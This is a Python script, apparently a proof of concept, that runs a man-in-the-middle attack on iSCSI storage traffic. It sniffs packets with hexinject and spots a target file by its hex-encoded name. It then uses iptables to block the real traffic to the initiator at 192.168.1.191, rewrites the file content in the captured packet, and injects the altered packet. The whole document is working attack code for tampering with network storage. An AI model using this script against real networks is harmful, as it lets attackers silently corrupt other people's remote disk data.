from scapy.all import *
import sys
import os
running = True
rule_added = False
while(running):
	# -c parameter is the # of packets we want to sniff.
	packet_read = os.popen('hexinject -s -i eth0 -c 100 -f tcp').read()
        print packet_read + "\n" + '*' * 60 + "\n" 
	packet_list = packet_read.splitlines()
	for packet in packet_list:
		# first, look for the packet containing the 'test.txt', our file name
		if( '74 65 73 74 2E 74 78 74' in packet):
			# then block the MITM outgoing trafic to the initiator machine on the iscsi port 3260. With that, the file original content won't pass and we can inject our packet
			if (not rule_added):
				os.system("iptables -A OUTPUT -p tcp -d 192.168.1.191 --dport 3260 -j DROP")
				os.system("/sbin/iptables-save")
				rule_added = True
			print "found file name!"
			# below we look for the 'test iscsi file' in hex
		if ('54 65 73 74 20 49 53 43 53 49 20 46 69 6C 65' in packet):
			print "iscsi content file identified!"
			# we replace 'Test ISCSI File' with 'Test ISCSI Hack'
			packet = packet.replace('54 65 73 74 20 49 53 43 53 49 20 46 69 6C 65', '54 65 73 74 20 49 53 43 53 49 20 48 61 63 6B', 2) 
			#packet_file = open('packet', 'w')
			#packet_file.write(packet_read)
			print " packet modified: - - - " + packet
			# reopen traffic to port 3260 and inject the packets with the new modified packet
			os.system("iptables -D OUTPUT -p tcp -d 192.168.1.191 --dport 3260 -j DROP")
			os.system("/sbin/iptables-save")
			os.system("echo '"  + packet + "' | hexinject -p -i eth0")
			running = False
